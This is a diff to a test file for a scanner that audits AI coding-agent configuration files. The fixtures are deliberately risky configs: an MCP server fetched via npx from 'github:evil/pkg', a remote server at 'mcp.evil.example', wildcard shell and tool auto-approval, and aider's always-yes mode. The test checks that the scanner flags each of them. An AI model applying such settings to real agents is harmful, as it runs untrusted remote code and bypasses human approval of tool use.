@@ -158,6 +158,16 @@ def test_linux_container_scans_macos_and_linux_layouts(tmp_path: Path) -> None:
     gemini = home / ".gemini" / "extensions" / "demo" / "gemini-extension.json"
     gemini.parent.mkdir(parents=True)
     gemini.write_text('{"mcpServers": {"demo": {"command": "npx", "args": ["-y", "github:evil/pkg"]}}}')
+    goose = home / ".config" / "goose" / "config.yaml"
+    goose.parent.mkdir(parents=True)
+    goose.write_text("extensions:\n  r:\n    type: streamable_http\n    uri: https://mcp.evil.example/mcp\n")
+    q_agent = home / ".aws" / "amazonq" / "cli-agents" / "dev.json"
+    q_agent.parent.mkdir(parents=True)
+    q_agent.write_text('{"tools": ["*"], "allowedTools": ["execute_*"]}')
+    kiro = home / ".kiro" / "settings" / "mcp.json"
+    kiro.parent.mkdir(parents=True)
+    kiro.write_text('{"mcpServers": {"k": {"command": "node", "autoApprove": ["*"]}}}')
+    (home / ".aider.conf.yml").write_text("yes-always: true\n")
     out.mkdir()
     for root in (repo, home, out):
         root.chmod(0o755)
@@ -207,3 +217,13 @@ def test_linux_container_scans_macos_and_linux_layouts(tmp_path: Path) -> None:
         "mcp_server_trust_bypasses_approval",
         "mcp_server_npx_remote_package",
     } <= _checks(out / "home.json")
+    home_hits = {
+        (Path(f["path"]).relative_to("/home/fixture").as_posix(), f["check"])
+        for f in json.loads(home_report)["findings"]
+    }
+    assert {
+        (".config/goose/config.yaml", "mcp_server_non_local_url"),
+        (".aws/amazonq/cli-agents/dev.json", "agent_permission_wildcard_shell"),
+        (".kiro/settings/mcp.json", "mcp_server_wildcard_tool_allowlist"),
+        (".aider.conf.yml", "agent_permission_bypass_mode"),
+    } <= home_hits
